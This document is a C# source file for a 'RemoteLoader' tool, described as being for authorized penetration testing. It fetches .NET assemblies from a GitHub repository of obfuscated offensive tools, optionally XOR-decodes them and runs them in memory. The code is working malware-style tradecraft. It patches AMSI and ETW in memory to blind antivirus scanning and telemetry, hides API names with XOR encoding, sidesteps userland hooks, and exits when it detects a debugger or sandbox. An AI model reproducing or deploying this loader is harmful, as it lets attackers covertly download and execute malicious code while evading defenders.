/*
 * RemoteLoader.cs — by hstn
 * In-memory .NET assembly loader from a GitHub repository.
 * Designed for authorized use in internal penetration testing engagements.
 *
 * Compile (.NET 8 SDK):
 *   dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true
 *
 * Usage:
 *   RemoteLoader.exe [--repo owner/name/subfolder] [--token <PAT>] [--xor <byte>]
 *
 * NOTE: Only managed .NET assemblies can be reflectively loaded.
 *       Native binaries (PyInstaller, C++, Go, etc.) are not supported.
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace RemoteLoader
{
    internal static class Program
    {
        // ─── Obfuscation key ─────────────────────────────────────────────────
        private const byte K = 0x41;

        // amsi.dll              XOR K
        private static readonly byte[] _amsiDll      = {0x20,0x2C,0x32,0x28,0x6F,0x25,0x2D,0x2D};
        // AmsiScanBuffer        XOR K
        private static readonly byte[] _amsiFunc     = {0x00,0x2C,0x32,0x28,0x12,0x22,0x20,0x2F,0x03,0x34,0x27,0x27,0x24,0x33};
        // ntdll.dll             XOR K
        private static readonly byte[] _ntdll        = {0x2F,0x35,0x25,0x2D,0x2D,0x6F,0x25,0x2D,0x2D};
        // EtwEventWrite         XOR K
        private static readonly byte[] _etwFunc      = {0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24};
        // EtwEventWriteFull     XOR K
        private static readonly byte[] _etwFullFunc  = {0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24,0x07,0x34,0x2D,0x2D};

        // Patch bytes XOR K — never appear as plaintext in .rdata:
        //   AMSI: mov eax,0x80070057 ; ret   → B8 57 00 07 80 C3  XOR K → F9 16 41 46 C1 82
        //   ETW:  ret                         → C3                 XOR K → 82
        private static readonly byte[] _amsiPatch = {0xF9,0x16,0x41,0x46,0xC1,0x82};
        private static readonly byte[] _etwPatch  = {0x82};

        // User-Agent pool — one chosen at random per session
        private static readonly string[] _userAgents =
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        };

        // ─── P/Invoke ─────────────────────────────────────────────────────────
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string n);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr h, string p);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string m);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        // Fallback only — prefer NtProtectVirtualMemory below
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(
            IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        // Lower-level alternative that bypasses VirtualProtect userland hooks
        [DllImport("ntdll.dll")]
        private static extern uint NtProtectVirtualMemory(
            IntPtr processHandle, ref IntPtr baseAddress,
            ref IntPtr regionSize, uint newProtect, out uint oldProtect);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CheckRemoteDebuggerPresent(
            IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

        // SM_CXSCREEN=0, SM_CYSCREEN=1
        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        // ─── String / byte decoder ────────────────────────────────────────────
        private static string Decode(byte[] enc)
        {
            var sb = new StringBuilder(enc.Length);
            foreach (byte b in enc) sb.Append((char)(b ^ K));
            return sb.ToString();
        }

        private static byte[] DecodeBytes(byte[] enc)
        {
            var r = new byte[enc.Length];
            for (int i = 0; i < enc.Length; i++) r[i] = (byte)(enc[i] ^ K);
            return r;
        }

        // ─── Memory cleanup ───────────────────────────────────────────────────
        private static void ClearBytes(byte[] b) { if (b != null) Array.Clear(b, 0, b.Length); }

        // ─── Protected memory write ───────────────────────────────────────────
        // Uses NtProtectVirtualMemory (avoids VirtualProtect hooks); falls back
        // to VirtualProtect if the NT call fails.
        private static bool WriteToMemory(IntPtr addr, byte[] bytes)
        {
            IntPtr baseAddr = addr;
            IntPtr size     = (IntPtr)bytes.Length;
            uint   old;

            uint status = NtProtectVirtualMemory(
                new IntPtr(-1), ref baseAddr, ref size, 0x40, out old);
            bool usedNt = status == 0;

            if (!usedNt && !VirtualProtect(addr, (UIntPtr)bytes.Length, 0x40, out old))
                return false;

            Marshal.Copy(bytes, 0, addr, bytes.Length);

            baseAddr = addr;
            size     = (IntPtr)bytes.Length;
            if (usedNt) NtProtectVirtualMemory(new IntPtr(-1), ref baseAddr, ref size, old, out _);
            else        VirtualProtect(addr, (UIntPtr)bytes.Length, old, out _);

            return true;
        }

        // ─── AMSI bypass ──────────────────────────────────────────────────────
        private static void PatchAmsi()
        {
            try
            {
                IntPtr hAmsi = LoadLibrary(Decode(_amsiDll));
                if (hAmsi == IntPtr.Zero) { Warn("LoadLibrary(amsi) failed"); return; }

                IntPtr pScan = GetProcAddress(hAmsi, Decode(_amsiFunc));
                if (pScan == IntPtr.Zero) { Warn("GetProcAddress(AmsiScanBuffer) failed"); return; }

                byte[] patch = DecodeBytes(_amsiPatch);
                bool ok = WriteToMemory(pScan, patch);
                ClearBytes(patch);

                if (!ok) { Warn("AMSI patch write failed"); return; }
                Ok("AMSI bypass applied");
            }
            catch (Exception ex) { Warn($"AMSI patch error: {ex.Message}"); }
        }

        // ─── ETW bypass ───────────────────────────────────────────────────────
        // Patches EtwEventWrite AND EtwEventWriteFull — both are telemetry sinks
        // that Defender's ETW consumer reads for Assembly.Load events.
        private static void PatchEtw()
        {
            try
            {
                IntPtr hNtdll = GetModuleHandle(Decode(_ntdll));
                if (hNtdll == IntPtr.Zero)
                {
                    hNtdll = LoadLibrary(Decode(_ntdll));
                    if (hNtdll == IntPtr.Zero) { Warn("Could not resolve ntdll"); return; }
                }

                byte[] patch = DecodeBytes(_etwPatch);

                IntPtr pEtw = GetProcAddress(hNtdll, Decode(_etwFunc));
                if (pEtw != IntPtr.Zero) WriteToMemory(pEtw, patch);

                IntPtr pEtwFull = GetProcAddress(hNtdll, Decode(_etwFullFunc));
                if (pEtwFull != IntPtr.Zero) WriteToMemory(pEtwFull, patch);

                ClearBytes(patch);
                Ok("ETW bypass applied");
            }
            catch (Exception ex) { Warn($"ETW patch error: {ex.Message}"); }
        }

        // ─── Anti-debug ───────────────────────────────────────────────────────
        private static void CheckDebugger()
        {
            // Managed debugger attached
            if (Debugger.IsAttached)
            { Console.Error.WriteLine("[-] Environment check failed (debugger)"); Environment.Exit(0); }

            // Native debugger (PEB.BeingDebugged)
            if (IsDebuggerPresent())
            { Console.Error.WriteLine("[-] Environment check failed (native debugger)"); Environment.Exit(0); }

            // Remote/kernel debugger
            bool remote = false;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remote);
            if (remote)
            { Console.Error.WriteLine("[-] Environment check failed (remote debugger)"); Environment.Exit(0); }

            // Timing — a single-stepped tight loop takes orders of magnitude longer
            long t1 = Stopwatch.GetTimestamp();
            for (int i = 0; i < 1_000_000; i++) { }
            long t2 = Stopwatch.GetTimestamp();
            double ms = (double)(t2 - t1) / Stopwatch.Frequency * 1000.0;
            if (ms > 2000)
            { Console.Error.WriteLine("[-] Environment check failed (timing)"); Environment.Exit(0); }
        }

        // ─── Sandbox check ────────────────────────────────────────────────────
        private static void CheckSandbox()
        {
            // Uptime — quick-reset sandboxes boot and execute immediately
            long uptimeMs = (uint)Environment.TickCount;
            if (uptimeMs < 180_000)
            { Console.Error.WriteLine("[-] Environment check failed (uptime)"); Environment.Exit(0); }

            // Process count
            try
            {
                if (Process.GetProcesses().Length < 15)
                { Console.Error.WriteLine("[-] Environment check failed (processes)"); Environment.Exit(0); }
            }
            catch { }

            // Disk size — sandbox VMs typically have < 80 GB virtual disks
            try
            {
                string root = Path.GetPathRoot(
                    Environment.GetFolderPath(Environment.SpecialFolder.System)) ?? "C:\\";
                if (new DriveInfo(root).TotalSize < 60L * 1024 * 1024 * 1024)
                { Console.Error.WriteLine("[-] Environment check failed (disk)"); Environment.Exit(0); }
            }
            catch { }

            // Screen resolution — many sandboxes default to 800×600 or 1024×768
            try
            {
                if (GetSystemMetrics(0) < 1024 || GetSystemMetrics(1) < 600)
                { Console.Error.WriteLine("[-] Environment check failed (display)"); Environment.Exit(0); }
            }
            catch { }

            // Username — common in automated analysis environments
            string user     = Environment.UserName.ToLowerInvariant();
            string[] badUsers =
                { "sandbox", "virus", "malware", "sample", "analysis",
                  "analyst", "cuckoo", "honey", "vmware", "maltest" };
            if (badUsers.Any(u => user.Contains(u)))
            { Console.Error.WriteLine("[-] Environment check failed (user)"); Environment.Exit(0); }
        }

        // ─── XOR payload decoder ─────────────────────────────────────────────
        private static byte[] XorBytes(byte[] data, byte key)
        {
            if (key == 0) return data;
            var result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) result[i] = (byte)(data[i] ^ key);
            return result;
        }

        // ─── GitHub API ───────────────────────────────────────────────────────
        private static async Task<List<(string Name, string DownloadUrl, long Size)>>
            ListBinaries(HttpClient http, string owner, string repo, string folder, string branch)
        {
            string url  = $"https://api.github.com/repos/{owner}/{repo}/contents/{folder}?ref={branch}";
            string json = await (await http.GetAsync(url))
                               .EnsureSuccessStatusCode()
                               .Content.ReadAsStringAsync();

            var results = new List<(string, string, long)>();
            using JsonDocument doc = JsonDocument.Parse(json);

            foreach (JsonElement item in doc.RootElement.EnumerateArray())
            {
                string name = item.GetProperty("name").GetString() ?? "";
                if (!name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) &&
                    !name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                    continue;

                string dlUrl = item.TryGetProperty("download_url", out var dl)
                               ? dl.GetString() ?? "" : "";
                long   size  = item.TryGetProperty("size", out var sz)
                               ? sz.GetInt64() : 0;

                results.Add((name, dlUrl, size));
            }
            return results;
        }

        // ─── .NET assembly detector ──────────────────────────────────────────
        // Checks PE optional-header data directory entry 14 (COM/CLR descriptor).
        // Non-zero VirtualAddress = managed .NET assembly.
        private static bool IsNetAssembly(byte[] data)
        {
            try
            {
                if (data.Length < 0x40) return false;
                if (data[0] != 0x4D || data[1] != 0x5A) return false;

                int peOff = BitConverter.ToInt32(data, 0x3C);
                if (peOff + 4 >= data.Length) return false;
                if (data[peOff] != 0x50 || data[peOff+1] != 0x45 ||
                    data[peOff+2] != 0    || data[peOff+3] != 0)   return false;

                int optOff = peOff + 4 + 20;
                if (optOff + 2 >= data.Length) return false;

                ushort magic = BitConverter.ToUInt16(data, optOff);
                int clrOff = magic switch
                {
                    0x10B => optOff + 96  + 14 * 8,
                    0x20B => optOff + 112 + 14 * 8,
                    _     => -1
                };
                if (clrOff < 0 || clrOff + 4 >= data.Length) return false;

                return BitConverter.ToUInt32(data, clrOff) != 0;
            }
            catch { return false; }
        }

        // ─── Entry-point discovery ────────────────────────────────────────────
        private static MethodInfo? FindMain(Assembly asm)
        {
            var flags = BindingFlags.Public | BindingFlags.Static;

            Type? prog = asm.GetTypes().FirstOrDefault(t => t.Name == "Program");
            if (prog != null)
            {
                MethodInfo? m = prog.GetMethod("Main", flags);
                if (m != null) return m;
            }

            return asm.GetTypes()
                      .Select(t => t.GetMethod("Main", flags))
                      .FirstOrDefault(m => m != null);
        }

        // ─── Argument parser (honours double-quoted tokens) ───────────────────
        private static string[] ParseArgs(string input)
        {
            var tokens  = new List<string>();
            var current = new StringBuilder();
            bool inQ    = false;

            foreach (char c in input)
            {
                if (c == '"')          { inQ = !inQ; continue; }
                if (c == ' ' && !inQ)
                {
                    if (current.Length > 0) { tokens.Add(current.ToString()); current.Clear(); }
                    continue;
                }
                current.Append(c);
            }
            if (current.Length > 0) tokens.Add(current.ToString());
            return tokens.ToArray();
        }

        // ─── Console helpers ──────────────────────────────────────────────────
        private static void Info(string msg) { Console.ForegroundColor = ConsoleColor.Cyan;   Console.WriteLine($"[*] {msg}"); Console.ResetColor(); }
        private static void Ok(string msg)   { Console.ForegroundColor = ConsoleColor.Green;  Console.WriteLine($"[+] {msg}"); Console.ResetColor(); }
        private static void Warn(string msg) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine($"[!] {msg}"); Console.ResetColor(); }
        private static void Err(string msg)  { Console.ForegroundColor = ConsoleColor.Red;    Console.WriteLine($"[-] {msg}"); Console.ResetColor(); }

        private static void PrintBanner()
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(@"
  ____                      _       _                    _
 |  _ \ ___ _ __ ___   ___ | |_ ___| |     ___  __ _  __| | ___ _ __
 | |_) / _ \ '_ ` _ \ / _ \| __/ _ \ |    / _ \/ _` |/ _` |/ _ \ '__|
 |  _ <  __/ | | | | | (_) | ||  __/ |___| (_) | (_| | (_| |  __/ |
 |_| \_\___|_| |_| |_|\___/ \__\___|______\___/ \__,_|\__,_|\___|_|
");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("                         in-memory .NET loader  //  by hstn\n");
            Console.ResetColor();
        }

        private static void PrintHelp()
        {
            Console.WriteLine(@"
Usage:
  RemoteLoader.exe [options]

Options:
  --repo    owner/name/subfolder  GitHub path    (default: hrstn/internal-pentest-precompiled-tools/ObfuscatedSharpCollection-main/NetFramework_4.7_Any)
  --branch  <branch>             Repo branch    (default: main)
  --token   <PAT>                GitHub PAT for private repos
  --xor     <byte>               XOR key (0-255) to decode payload before loading
  --help                         Show this message

NOTE: Only managed .NET assemblies are supported. Native binaries (PyInstaller,
      C++, Go, etc.) cannot be reflectively loaded and will be rejected.

Examples:
  RemoteLoader.exe
  RemoteLoader.exe --repo YourOrg/tools/bin --branch dev
  RemoteLoader.exe --repo YourOrg/private/bin --token ghp_xxxx --xor 65
");
        }

        // ─── Entry point ──────────────────────────────────────────────────────
        private static async Task Main(string[] cliArgs)
        {
            PrintBanner();

            string repoPath = "hrstn/internal-pentest-precompiled-tools/ObfuscatedSharpCollection-main/NetFramework_4.7_Any";
            string token    = "";
            string branch   = "main";
            byte   xorKey   = 0;

            for (int i = 0; i < cliArgs.Length; i++)
            {
                switch (cliArgs[i])
                {
                    case "--repo"   when i + 1 < cliArgs.Length: repoPath = cliArgs[++i]; break;
                    case "--token"  when i + 1 < cliArgs.Length: token    = cliArgs[++i]; break;
                    case "--branch" when i + 1 < cliArgs.Length: branch   = cliArgs[++i]; break;
                    case "--xor"   when i + 1 < cliArgs.Length:
                        if (byte.TryParse(cliArgs[++i], out byte k)) xorKey = k;
                        else Warn($"Invalid --xor value '{cliArgs[i]}', defaulting to 0");
                        break;
                    case "--help": case "-h": PrintHelp(); return;
                    default: Warn($"Unknown argument: {cliArgs[i]}"); break;
                }
            }

            // ── Evasion ───────────────────────────────────────────────────────
            PatchAmsi();
            PatchEtw();
            CheckDebugger();
            CheckSandbox();

            // ── TLS 1.2 + system proxy ────────────────────────────────────────
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            var handler = new HttpClientHandler { UseProxy = true, Proxy = WebRequest.GetSystemWebProxy() };
            handler.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            // ── Validate repo path ────────────────────────────────────────────
            string[] parts = repoPath.Split('/');
            if (parts.Length < 3) { Err("--repo must be owner/name/subfolder"); return; }
            string owner  = parts[0];
            string repo   = parts[1];
            string folder = string.Join("/", parts[2..]);

            // ── HTTP client ───────────────────────────────────────────────────
            using var http = new HttpClient(handler);
            http.DefaultRequestHeaders.Add("User-Agent",
                _userAgents[Random.Shared.Next(_userAgents.Length)]);
            if (!string.IsNullOrEmpty(token))
                http.DefaultRequestHeaders.Add("Authorization", $"token {token}");

            // ── List binaries ─────────────────────────────────────────────────
            Info($"Querying github.com/{owner}/{repo}/{folder} (branch: {branch}) ...");

            List<(string Name, string DownloadUrl, long Size)> binaries;
            try
            {
                binaries = await ListBinaries(http, owner, repo, folder, branch);
            }
            catch (HttpRequestException ex) when ((int?)ex.StatusCode == 404)
            { Err($"Path not found: {owner}/{repo}/{folder}"); return; }
            catch (HttpRequestException ex) when ((int?)ex.StatusCode == 403)
            { Err("Rate limit or auth required (403). Use --token."); return; }
            catch (Exception ex)
            { Err($"GitHub API error: {ex.Message}"); return; }

            if (binaries.Count == 0) { Err("No .exe/.dll files found."); return; }

            // ── Menu ──────────────────────────────────────────────────────────
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("  Available binaries:\n");
            Console.ResetColor();

            for (int i = 0; i < binaries.Count; i++)
                Console.WriteLine($"  [{i + 1,2}]  {binaries[i].Name,-42} {binaries[i].Size / 1024,6} KB");
            Console.WriteLine("  [ 0]  Exit\n");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("  [!] Only managed .NET assemblies can be loaded. Native binaries will be rejected.\n");
            Console.ResetColor();

            Console.Write("Select number or partial filename: ");
            string sel = (Console.ReadLine() ?? "0").Trim();

            if (sel is "0" or "exit" or "q") return;

            (string Name, string DownloadUrl, long Size) chosen = default;
            if (int.TryParse(sel, out int idx) && idx >= 1 && idx <= binaries.Count)
                chosen = binaries[idx - 1];
            else
                chosen = binaries.FirstOrDefault(b =>
                    b.Name.Contains(sel, StringComparison.OrdinalIgnoreCase));

            if (chosen.Name == null)                          { Err($"No match for: {sel}"); return; }
            if (string.IsNullOrEmpty(chosen.DownloadUrl))     { Err($"No download_url for {chosen.Name}"); return; }

            // ── Download ──────────────────────────────────────────────────────
            Info($"Downloading {chosen.Name} ...");
            byte[] asmBytes;
            try   { asmBytes = await http.GetByteArrayAsync(chosen.DownloadUrl); }
            catch (Exception ex) { Err($"Download failed: {ex.Message}"); return; }
            Ok($"{asmBytes.Length:N0} bytes received");

            asmBytes = XorBytes(asmBytes, xorKey);
            if (xorKey != 0) Ok($"Payload XOR-decoded (key=0x{xorKey:X2})");

            // ── Verify managed assembly ───────────────────────────────────────
            if (!IsNetAssembly(asmBytes))
            {
                Err($"{chosen.Name} is a native/unmanaged binary (PyInstaller, C++, etc.) — cannot reflectively load.");
                ClearBytes(asmBytes);
                return;
            }

            // ── Load ──────────────────────────────────────────────────────────
            Assembly asm;
            try   { asm = Assembly.Load(asmBytes); }
            catch (Exception ex) { Err($"Assembly.Load failed: {ex.Message}"); ClearBytes(asmBytes); return; }

            // Zero the download buffer — reduce in-memory artifact window
            ClearBytes(asmBytes);

            MethodInfo? entry = FindMain(asm);
            if (entry == null) { Err($"No static Main found in {chosen.Name}"); return; }
            Ok($"Entry point: {entry.DeclaringType?.FullName}::{entry.Name}");

            // ── Args ──────────────────────────────────────────────────────────
            Console.Write("Arguments (blank for none): ");
            string argsInput = (Console.ReadLine() ?? "").Trim();
            string[] toolArgs = string.IsNullOrWhiteSpace(argsInput)
                ? Array.Empty<string>()
                : ParseArgs(argsInput);

            Info($"Executing {chosen.Name}{(toolArgs.Length > 0 ? $" -- {argsInput}" : "")} ...\n");

            // ── Invoke ────────────────────────────────────────────────────────
            try
            {
                ParameterInfo[] parms = entry.GetParameters();
                if (parms.Length == 0) entry.Invoke(null, null);
                else                   entry.Invoke(null, new object[] { toolArgs });
            }
            catch (TargetInvocationException tie)
            { Warn($"Tool exception: {tie.InnerException?.Message ?? tie.Message}"); }
            catch (Exception ex)
            { Warn($"Invocation error: {ex.Message}"); }

            Info("Done.");
        }
    }
}
